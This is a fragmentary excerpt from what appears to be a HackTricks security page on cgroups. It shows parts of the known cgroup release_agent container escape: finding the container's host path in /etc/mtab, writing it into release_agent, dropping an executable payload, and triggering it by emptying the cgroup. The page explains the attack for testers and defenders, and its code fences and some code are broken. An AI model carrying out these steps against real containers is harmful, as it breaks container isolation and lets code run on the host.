...
source_url: https://hacktricks.wiki/linux-hardening/containers-namespaces/container-security/protections/cgroups.html
...
The historical one-liner PoC is:[\[1\]](#references)
...
The same idea is easier to understand when broken into steps.[\[1\]](#references)
...
```
1. Identify the host path that corresponds to the container filesystem:

```
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
1. Drop a payload that will be visible from the host path:
...
chmod +x /cmd
```
1. Trigger execution by making the cgroup empty:
